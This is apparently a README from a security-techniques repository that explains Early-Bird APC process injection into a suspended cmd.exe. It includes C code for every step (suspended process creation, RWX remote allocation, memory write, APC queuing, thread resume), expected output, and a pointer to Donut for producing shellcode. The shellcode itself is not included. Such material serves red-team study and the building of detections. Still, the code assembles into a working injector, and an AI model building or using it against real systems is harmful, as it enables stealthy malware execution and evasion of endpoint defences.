# Early-Bird Injection

This folder demonstrates **Early-Bird injection**—a process injection technique that combines process creation with APC queuing to guarantee shellcode execution at startup.

**Important Disclaimer**: This code is for educational purposes only on systems you own or have explicit authorization to test. Unauthorized injection is illegal.

---

## What Is Early-Bird Injection?

Early-Bird injection is an advanced variant of APC injection that overcomes the fundamental limitation of standard APC injection: **guaranteed execution timing**.

### The Problem with Standard APC Injection

Standard APC injection has a critical weakness: the shellcode only executes when the target thread enters an alertable state. There is **no guarantee** that this will happen in a reasonable timeframe—or at all. While queuing APCs on multiple threads increases the likelihood of execution, it introduces the risk of process crashes or detection.

### The Early-Bird Solution

Early-Bird injection eliminates this timing uncertainty by:

1. **Create Process (Suspended)** – Spawn a new process in a suspended state
2. **Allocate Memory** – Allocate executable memory in the new process
3. **Write Shellcode** – Write shellcode to the allocated memory
4. **Queue APC** – Queue an APC on the primary thread (which is suspended)
5. **Resume Process** – Resume the main thread

Since the thread is **guaranteed to exit the suspended state** when resumed, the APC **is guaranteed to execute**—even before the application's main code runs.

### In This Folder

The example demonstrates **Early-Bird injection into cmd.exe**—creating a suspended process, injecting shellcode via APC, and triggering execution.

**Flow:**
```
Injector Process
    │
    ├─ CreateProcessW(CREATE_SUSPENDED) → Spawn cmd.exe suspended
    │
    ├─ VirtualAllocEx() → Allocate memory in suspended process
    │
    ├─ WriteProcessMemory() → Write shellcode to memory
    │
    ├─ QueueUserAPC() → Queue APC on primary thread
    │
    └─ ResumeThread() → Resume suspended thread
        │
        └─ Suspended Process (cmd.exe)
            │
            ├─ Thread resumes from suspension
            │
            ├─ Windows checks APC queue
            │
            └─ Shellcode executes (guaranteed!)
```

---

## Code Breakdown

### Creating a Suspended Process

```c
STARTUPINFOW si = { 0 };
si.cb = sizeof(si);
si.dwFlags = STARTF_USESHOWWINDOW;

PROCESS_INFORMATION pi = { 0 };

BOOL success = CreateProcessW(
    L"C:\\Windows\\System32\\cmd.exe",  // Target executable
    NULL,                                // Command line arguments
    NULL,                                // Process security attributes
    NULL,                                // Thread security attributes
    FALSE,                               // Don't inherit handles
    CREATE_SUSPENDED,                    // Create in suspended state
    NULL,                                // Environment variables
    NULL,                                // Current directory
    &si,                                 // Startup info
    &pi                                  // Process information output
);
```

Creates cmd.exe in a suspended state—the primary thread is paused before any of the process's code executes.

### Memory Allocation in Target

```c
LPVOID HandleMemory = VirtualAllocEx(
    pi.hProcess,                    // Handle to suspended process
    NULL,                           // Preferred address (OS chooses)
    sizeof(shellcode),              // Size to allocate
    MEM_COMMIT | MEM_RESERVE,       // Allocate and commit pages
    PAGE_EXECUTE_READWRITE          // Make executable
);
```

Allocates executable memory in the suspended process's address space.

### Writing Shellcode

```c
SIZE_T bytesWritten = 0;
BOOL RESULT = WriteProcessMemory(
    pi.hProcess,                // Suspended process handle
    HandleMemory,               // Remote address
    shellcode,                  // Shellcode buffer
    sizeof(shellcode),          // Size to copy
    &bytesWritten
);
```

Copies shellcode into the allocated memory while the process is still suspended.

### Queuing the APC

```c
DWORD apcResult = QueueUserAPC(
    (PAPCFUNC)HandleMemory,     // Shellcode address
    pi.hThread,                 // Primary thread handle
    0                           // Optional parameter
);
```

Queues the APC on the primary thread. Unlike standard APC injection, this APC is **guaranteed to execute** because the thread is about to be resumed.

### Resuming Execution

```c
ResumeThread(pi.hThread);
```

Resumes the suspended primary thread. When it wakes up, Windows checks the APC queue and executes the queued shellcode **before any process initialization code runs**.

### Cleanup

```c
CloseHandle(pi.hThread);    // Close thread handle
CloseHandle(pi.hProcess);   // Close process handle
```

Releases acquired handles. The suspended process continues running with injected shellcode.

---

## Prerequisites

### System Requirements
- Windows 10/11 (examples target modern Windows)
- Administrator privileges (usually required for process creation)
- Isolated test environment **strongly recommended**

### Development Tools
- **C/C++ Compiler:** MSVC (Visual Studio) or MinGW-w64
- **Debugger:** WinDbg, x64dbg, or Visual Studio Debugger (optional)

### Knowledge Requirements
- Understanding of process creation (`CreateProcessW`)
- Understanding of APC mechanisms and execution timing
- Understanding of shellcode (position-independent machine code)
- Understanding of Windows process suspension and resumption

---

## Running

### Execute the Injector

```powershell
.\Early-Bird.exe
```

### Expected Output

```
Process created successfully with PID: 1234
Memory allocated successfully at address: 0x0000000002A40000
Wrote 5280 bytes to allocated memory.
APC queued successfully to thread ID: 5678
[Shellcode executes immediately in suspended process]
```

The suspended cmd.exe process:
- Is created with injected shellcode waiting in memory
- Has an APC queued on its primary thread
- Is resumed and immediately executes the APC callback (shellcode)
- Continues with normal process initialization afterward

---

## Generating Shellcode

The `shellcode` array in the code must be filled with actual machine code bytes. Use **Donut** (documented in [../Shellcode/README.md](../Shellcode/README.md)) to generate shellcode and convert to hex format.

---

## How It Works: Step-by-Step

```
┌──────────────────────────────────────────────┐
│ Injector Process Starts                      │
└──────────────┬───────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────┐
│ CreateProcessW(CREATE_SUSPENDED)             │
│ ├─ Spawn cmd.exe in suspended state          │
│ ├─ Primary thread created but paused         │
│ └─ Process handle & thread handle obtained   │
└──────────────┬───────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────┐
│ VirtualAllocEx()                             │
│ ├─ Allocate memory in suspended process      │
│ └─ Address: 0x0000000002A40000              │
└──────────────┬───────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────┐
│ WriteProcessMemory()                         │
│ ├─ Copy shellcode to suspended process       │
│ └─ 5280 bytes written                        │
└──────────────┬───────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────┐
│ QueueUserAPC()                               │
│ ├─ Queue APC on primary thread               │
│ ├─ Thread still suspended                    │
│ └─ APC waits in queue...                     │
└──────────────┬───────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────┐
│ ResumeThread()                               │
│ ├─ Thaw the suspended primary thread         │
│ └─ Thread begins execution                   │
└──────────────┬───────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────┐
│ Thread Resumes (Context Switch)              │
│ ├─ CPU context restored                      │
│ └─ Instruction pointer set to entry point    │
└──────────────┬───────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────┐
│ Windows APC Delivery                         │
│ ├─ Check thread's APC queue                  │
│ ├─ APC found! Execute callback               │
│ └─ Call shellcode at 0x0000000002A40000     │
└──────────────┬───────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────┐
│ Shellcode Execution                          │
│ ├─ Runs in target process context            │
│ ├─ Executes payload (MessageBox, etc.)       │
│ └─ Returns from APC callback                 │
└──────────────┬───────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────┐
│ Process Initialization Continues             │
│ ├─ Shellcode completed                       │
│ ├─ Process continues normal startup          │
│ └─ Main executable code executes             │
└──────────────┬───────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────┐
│ Cleanup (Injector)                           │
│ ├─ CloseHandle(pi.hThread)                   │
│ └─ CloseHandle(pi.hProcess)                  │
└──────────────────────────────────────────────┘
```

---

## Advantages of Early-Bird Injection

✓ **Guaranteed execution** – APC executes when process resumes (no alertable state requirement)
✓ **No thread enumeration** – Use the process's primary thread directly
✓ **Clean timing** – Shellcode runs before process initialization
✓ **Single APC** – No need to queue multiple APCs to all threads
✓ **Reliable** – Process lifecycle ensures APC delivery

---

## Limitations and Risks

✗ **Process creation required** – Must be able to spawn new processes
✗ **Administrator privileges** – Usually required to create processes
✗ **Target selection** – Can only inject into specific target applications
✗ **Shellcode required** – Must have valid position-independent code
✗ **Visible artifact** – Process creation may be logged/monitored by EDR/AV

---

## Why Early-Bird Is Superior to Standard APC Injection

**Standard APC Injection Problem:**
- Find existing thread → Queue APC → Hope thread becomes alertable
- No guarantee of execution timing
- Multiple APCs = crash risk

**Early-Bird Injection Solution:**
- Create new process (suspended) → Queue APC → Resume
- Guaranteed execution when process resumes
- Single APC on single thread = stable
- Execution timing is predictable (immediately upon resume)

---

## Legal and Ethical Considerations

**Authorization Required:**
- Only use on systems you own
- Never test on systems without explicit written permission
- Works in authorized penetration testing scenarios only

**Responsible Disclosure:**
- Report findings through proper channels
- Give organizations time to patch
- Follow your organization's security policies

**Legal Implications:**
- Unauthorized code injection is illegal (Computer Fraud and Abuse Act in US)
- Similar laws exist in other jurisdictions
- Violations can result in criminal charges

---

## References

- [CreateProcessW Documentation](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw)
- [CREATE_SUSPENDED Flag](https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags)
- [ResumeThread Documentation](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread)
- [QueueUserAPC Documentation](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueapcthread)
- [VirtualAllocEx Documentation](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
- [WriteProcessMemory Documentation](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
- [Windows Internals](https://learn.microsoft.com/en-us/sysinternals/)

---

## Disclaimer

This code and documentation are provided for educational purposes on authorized systems only. Unauthorized process injection is illegal and violates computer fraud laws. You are solely responsible for compliance with applicable laws and organizational policies.
